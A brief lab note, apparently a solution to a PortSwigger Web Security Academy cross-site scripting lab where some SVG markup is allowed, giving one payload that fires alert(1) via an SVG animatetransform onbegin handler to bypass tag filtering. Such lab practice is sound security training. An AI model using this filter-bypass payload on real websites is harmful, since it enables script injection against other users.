# Lab

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

## Payload

```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```